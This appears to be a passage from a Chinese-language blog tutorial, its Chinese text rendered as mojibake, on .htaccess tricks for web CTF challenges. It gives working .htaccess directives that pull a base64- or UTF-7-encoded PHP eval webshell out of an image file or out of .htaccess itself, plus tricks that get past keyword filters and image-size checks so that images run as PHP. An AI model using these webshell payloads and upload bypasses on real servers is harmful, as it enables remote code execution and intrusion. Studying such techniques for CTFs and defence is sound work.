<p>åˆ©ç”¨ auto_append_file å’Œ PHP ä¼ªåè®®ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨ä¸€ä¸ªå›¾ç‰‡ä¸­å†™å…¥ç»è¿‡base64ç¼–ç åçš„ Webshellï¼Œç„¶åæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨ auto_append_file é…åˆ php://filter å°†å…¶åŒ…å«è¿›æ¥ï¼š</p>
<pre><code class="hljs nginx"><span class="hljs-attribute">php_value</span> auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=images.png&quot;</span>
<span class="hljs-comment"># images.png ä¸­æ˜¯ç»è¿‡base64ç¼–ç åçš„Webshell</span></code></pre>
<p>ä½¿ç”¨data://åè®®ä¹Ÿå¯ä»¥:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> auto_append_file data://text/plain;base<span class="hljs-number">64</span>,PD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+</code></pre>
<h5 id="UTF-7-ç¼–ç æ ¼å¼ç»•è¿‡"><a class="header-anchor" href="#UTF-7-ç¼–ç æ ¼å¼ç»•è¿‡">ğŸ­</a>UTF-7 ç¼–ç æ ¼å¼ç»•è¿‡</h5>
<p>å¦‚æˆ‘ä»¬åœ¨ä¸€ä¸ªå›¾ç‰‡ä¸­å†™å…¥ UTF-7 ç¼–ç æ ¼å¼çš„ Webshellï¼š</p>
<pre><code class="hljs swift"><span class="hljs-comment">// images.png</span>
+<span class="hljs-type">ADw?</span>php eval(+<span class="hljs-type">ACQAXw</span>-<span class="hljs-type">POST</span>+<span class="hljs-type">AFs</span>-whoami+<span class="hljs-type">AF0</span>)+<span class="hljs-type">ADs?</span>+<span class="hljs-type">AD4</span>-</code></pre>
<ul>
<li>ä½¿ç”¨ auto_append_file å°†å…¶åŒ…å«è¿›æ¥å¹¶è®¾ç½®ç¼–ç æ ¼å¼ä¸º UTF-7 ï¼š</li>
</ul>
<pre><code class="hljs stylus">php_value auto_append_file images.png
php_flag zend<span class="hljs-selector-class">.multibyte</span> <span class="hljs-number">1</span>
php_value zend<span class="hljs-selector-class">.script_encoding</span> <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre>
<ul>
<li>ä½¿ç”¨ php://filer ä¼ªåè®®è¿›è¡Œ UTF-7 ä¸ UTF-8 ä¹‹é—´çš„è½¬æ¢ï¼ˆUTF-16ã€UTF-32 ä¹Ÿå¯ä»¥ï¼‰ï¼š</li>
</ul>
<pre><code class="hljs ceylon">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> auto<span class="hljs-number">_</span>append<span class="hljs-number">_f</span>ile <span class="hljs-string">&quot;php://filter/read=convert.iconv.utf-7.utf-8/resource=images.png&quot;</span></code></pre>
<ul>
<li>ä½¿ç”¨ .htaccess è‡ªèº«åŒ…å«æ¥æ‰§è¡Œ Webshellï¼š</li>
</ul>
<pre><code class="hljs mipsasm">php_value auto_append_file .htaccess
php_flag zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span>
php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span>
<span class="hljs-comment"># +ADw?php eval(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-</span></code></pre>
<h2 id="Bypass"><a class="header-anchor" href="#Bypass">ğŸ­</a>Bypass</h2>
<h4 id="ç»•è¿‡è„å­—ç¬¦"><a class="header-anchor" href="#ç»•è¿‡è„å­—ç¬¦">ğŸ­</a>ç»•è¿‡è„å­—ç¬¦</h4>
<p>æœ‰çš„é¢˜ç›®ä¼šåœ¨æˆ‘ä»¬ä¸Šä¼ æˆ–å†™å…¥çš„æ–‡ä»¶ä¸­åŠ å…¥ä¸€ä¸ªæ··ä¹±çš„å­—ç¬¦ï¼ˆè„å­—ç¬¦ï¼‰ï¼Œç”±äºè¿™äº›å­—ç¬¦ä¸æ˜¯ .htaccess  æ–‡ä»¶çš„è¯­æ³•æˆ–æŒ‡ä»¤ï¼Œä¼šä½¿æˆ‘ä»¬çš„.htaccessæ–‡ä»¶ä¸ç”Ÿæ•ˆï¼Œå‡ºç°å“åº”500çš„é—®é¢˜ã€‚æ•…æˆ‘ä»¬è¦é‡‡ç”¨ <code>#</code> å¯¹è„å­—ç¬¦è¿›è¡Œæ³¨é‡Šï¼Œæˆ–ä½¿ç”¨åæ–œæ  <code>\</code> å°†æ¢è¡Œç¬¦è½¬ä¹‰æˆæ™®é€šå­—ç¬¦ã€‚</p>
<h4 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a class="header-anchor" href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤">ğŸ­</a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h4>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨åæ–œæ  <code>\</code> åŠ æ¢è¡Œæ¥å®ç°ã€‚æ¯”å¦‚é¢˜ç›®è¿‡æ»¤äº† typeã€php ç­‰æ•æ„Ÿå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¾‘ .htaccessï¼š</p>
<pre><code class="hljs livescript">AddTy<span class="hljs-string">\</span>
pe application/x-httpd-ph<span class="hljs-string">\</span>
p .png
<span class="hljs-comment"># å³: AddType application/x-httpd-php .png</span></code></pre>
<h4 id="ç»•è¿‡å¯¹ä¸Šä¼ å›¾ç‰‡çš„å°ºå¯¸é™åˆ¶"><a class="header-anchor" href="#ç»•è¿‡å¯¹ä¸Šä¼ å›¾ç‰‡çš„å°ºå¯¸é™åˆ¶">ğŸ­</a>ç»•è¿‡å¯¹ä¸Šä¼ å›¾ç‰‡çš„å°ºå¯¸é™åˆ¶</h4>
<p>æœ‰çš„é¢˜ç›®åœ¨å›¾ç‰‡ä¸Šä¼ åŒºä¼šä½¿ç”¨ <code>getimagesize()</code> ç­‰å‡½æ•°å¯¹ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œå°ºå¯¸é™åˆ¶ï¼Œåªå…è®¸ä¸Šä¼ æŒ‡å®šå¤§å°å°ºå¯¸çš„å›¾ç‰‡ï¼Œå¹¶ä¸”ä¼šä½¿ç”¨ <code>exif_imagetype()</code> å‡½æ•°è¯»å–ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶å›¾ç‰‡ç±»å‹ã€‚æ­¤æ—¶å¦‚æœå¯ä»¥ä¸Šä¼  .htaccess æ¥è§£æå›¾ç‰‡çš„è¯æˆ‘ä»¬è¿˜éœ€è¦è®© .htaccess çš„å°ºå¯¸å’Œç»è¿‡  <code>exif_imagetype()</code>  æ£€æµ‹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>exif_imagetype()</code> å‡½æ•°æ”¯æŒçš„ WBMP å›¾åƒç±»å‹ç»•è¿‡ã€‚WBMPï¼ˆWireless Bitmapï¼‰æ˜¯ä¸€ç§ç§»åŠ¨è®¡ç®—æœºè®¾å¤‡ä½¿ç”¨çš„æ ‡å‡†å›¾åƒæ ¼å¼ï¼Œæ˜¯ä¸€ç§çº¯æ–‡æœ¬äºŒè¿›åˆ¶å›¾åƒæ ¼å¼çš„å›¾ç‰‡ï¼Œå®ä¾‹ï¼š</p>
<pre><code class="hljs apache"><span class="hljs-comment">#define test_width 16</span>
<span class="hljs-comment">#define test_height 7</span>
<span class="hljs-attribute">static</span> char test_bits[] = &#123;
<span class="hljs-attribute">0x13</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">15</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">93</span>, <span class="hljs-number">0</span>xcd, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>xa<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">93</span>, <span class="hljs-number">0</span>xc<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>,
<span class="hljs-attribute">0x00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">60</span> &#125;;</code></pre>
<p>WBMP å›¾åƒçš„å¼€å¤´å¯ä»¥ä½¿ç”¨ <code>#</code> è®¾ç½®å›¾åƒçš„å°ºå¯¸å¤§å°ï¼Œå‡è®¾é¢˜ç›®é™åˆ¶æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡å°ºå¯¸å¿…é¡»ä¸º1x1ï¼Œæˆ‘ä»¬åœ¨ä¸Šä¼ .htaccessæ—¶å°±å¯ä»¥ç”¨ WBMP ç»•è¿‡ï¼š</p>
<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> width 1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> height 1</span>
AddType application/x-httpd-php images.png</code></pre>
<p>å®ä¾‹å†™åœ¨å¦ä¸€ç¯‡æ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://liquor-boop.github.io/2021/08/11/ffi/">buuï¼ˆå…«)</a></p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/04/30/Web%E5%AE%89%E5%85%A8/%E4%B8%8E%20.htaccess%20%E7%9B%B8%E5%85%B3%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/">https://whoamianony.top/2021/04/30/Webå®‰å…¨/ä¸ .htaccess ç›¸å…³çš„å¥‡æ·«æŠ€å·§/</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/htaccess/">.htaccess</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/08/11/ffi/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">buuï¼ˆå…«ï¼‰</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/08/08/cmd/">
                        <span class="hidden-mobile">PHPæ— å‚æ•°RCE</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
